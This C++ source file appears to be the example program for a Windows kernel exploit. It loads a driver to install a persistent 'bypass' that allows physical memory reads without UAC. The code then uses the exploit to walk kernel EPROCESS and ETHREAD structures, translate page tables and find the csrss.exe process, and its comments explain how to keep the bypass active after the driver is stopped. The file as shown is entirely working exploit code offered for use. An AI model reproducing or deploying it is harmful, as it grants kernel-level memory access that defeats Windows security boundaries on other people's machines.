#include <Windows.h>
#include "Kernel.h"
int main() {
	Kernel Exploit;
	if (!Exploit.Initialize(true)) { // Start the driver and initialize the exploit
		printf("[-] Exploit failed to initialize\n");
		return -1;
	} 
	Exploit.Cleanup(); // By this point, the driver is fully stopped from running
	// Everything below is read/written using the exploit and does not need UAC permissions or even have the driver installed after this point
	// After running the exploit once, change Exploit.Initialize(true) to Exploit.Initialize(false) to prevent the driver from loading the bypass again 
	// since after this point the bypass will be loaded no matter what and no longer needs the driver for anything
	__int64 Process = Exploit.EProcess(GetCurrentProcessId());
	printf("[+] Current EProcess: (virtual) %llx\n", Process);
	__int64 DirectoryTable = Exploit.GetProcessDirectoryTable(Process);
	printf("[+] Current Directory Table: %llx\n", DirectoryTable);
	int UniqueProcessId;
	Exploit.ReadPhysical(Exploit.TranslateLinearAddress(DirectoryTable, Process + 0x440), &UniqueProcessId, 4); //_EPROCESS->UniqueProcessId
	printf("[+] Current UniqueProcessId: %d\n", UniqueProcessId);
	// Or you can utilize the Read<T> wrapper to simplify the above code
	__int64 SectionBaseAddress = Exploit.Read<__int64>(Exploit.TranslateLinearAddress(DirectoryTable, Process + 0x520));
	printf("[+] Current SectionBaseAddress: (virtual) %llx\n", SectionBaseAddress); //_EPROCESS->SectionBaseAddress

	DWORD ThreadId = GetCurrentThreadId();
	printf("[+] Current Thread Id: %d\n", ThreadId);
	__int64 Ethread = Exploit.EThread(DirectoryTable, Process, ThreadId);
	printf("[+] Current Ethread: %llx\n", Ethread);
	int csrssProcessId = Exploit.ProcessId("csrss.exe", 1);
	printf("[+] csrss ProcessId: %d\n", csrssProcessId);

	Sleep(-1);
}